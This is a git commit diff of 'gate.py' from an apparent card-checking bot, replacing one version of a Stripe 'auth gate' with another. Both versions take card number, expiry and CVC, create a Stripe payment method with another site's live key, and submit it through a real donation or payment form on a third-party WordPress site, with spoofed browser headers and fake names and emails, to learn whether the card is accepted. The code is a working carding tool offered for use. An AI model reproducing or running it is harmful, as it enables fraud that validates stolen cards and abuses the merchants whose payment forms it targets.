b44acc0ff623e45d3520e2bf46c396aade0bf4ff
balak853 <kingcrp8@gmail.com>
2025-03-18 16:59:17 +0530

    gate.py

--- BOT/AUTH/Stripe Auth/gate.py
+++ BOT/AUTH/Stripe Auth/gate.py
@@ -1,84 +1,76 @@
-import asyncio
-import base64
-import random
-from fake_useragent import UserAgent
-import requests
-from FUNC.defs import *
-import re
-from bs4 import BeautifulSoup
-from FUNC.defs import *
-
-# import requests
-
-
-def gets(s, start, end):
-            try:
-                start_index = s.index(start) + len(start)
-                end_index = s.index(end, start_index)
-                return s[start_index:end_index]
-            except ValueError:
-                return None
+import requests,re
+def Tele(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
 
 
+	headers = {
+			'authority': 'api.stripe.com',
+			'accept': 'application/json',
+			'accept-language': 'en-US,en;q=0.9',
+			'content-type': 'application/x-www-form-urlencoded',
+			'origin': 'https://js.stripe.com',
+			'referer': 'https://js.stripe.com/',
+			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-site',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+	pm = r1.json()['id']
 
 
-async def create_cvv_charge(fullz , session):
-    try:
-        cc , mes , ano , cvv = fullz.split("|")
-        user_agent          = UserAgent().random
-        random_data         = await get_random_info(session)
-        fname               = random_data["fname"]
-        lname               = random_data["lname"]
-        email               = random_data["email"]
+	cookies = {
+            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
+            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
+	}
 
+	headers = {
+            'authority': 'g-pg.com.au',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
+            'origin': 'https://g-pg.com.au',
+            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+	}
 
+	params = {
+			't': '1729922956202',
+	}
 
-        data={
-        'type':'card',
-        'card[number]':cc,
-        'card[cvc]':cvv,
-        'card[exp_month]':mes,
-        'card[exp_year]':ano,
-        'guid':'15272133-9ede-4e6e-b794-c198bb382765d92456',
-        'muid':'22e150f1-15d3-4b99-9666-08e841b7329b5c431b',
-        'sid':'2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
-        'pasted_fields':'number',
-        'payment_user_agent':'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
-        'referrer':'https://lumivoce.org',
-        'time_on_page':'27287',
-        'key':'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
-        }
-        response = await session.post('https://api.stripe.com/v1/payment_methods', data=data)
-
-
-        try:
-            id=response.json()['id']
-            # print(id)
-        except:
-            return response.text
-        
-
-        params = {
-            't': '1718807439228',
-        }
-
-        files = {
-            'action': (None, 'fluentform_submit'),
-            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=crishniki158%40gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=a73e2da4de&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
-            'form_id': (None, '49'),
-        }
-
-        response = await session.post(
-            'https://lumivoce.org/wp-admin/admin-ajax.php',
-            params=params,
-            files=files,
-        )
-
-        # print(response.text)
-
-        response =response.text
-        await asyncio.sleep(0.5)
-        return response
-
-    except Exception as e:
-        return str(e)
+	data = {
+            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+            'action': 'fluentform_submit',
+            'form_id': '5',
+	}
+	
+	r2 = requests.post(
+			'https://g-pg.com.au/wp-admin/admin-ajax.php',
+			params=params,
+			cookies=cookies,
+			headers=headers,
+			data=data,
+	)
+	return (r2.json()['errors'])
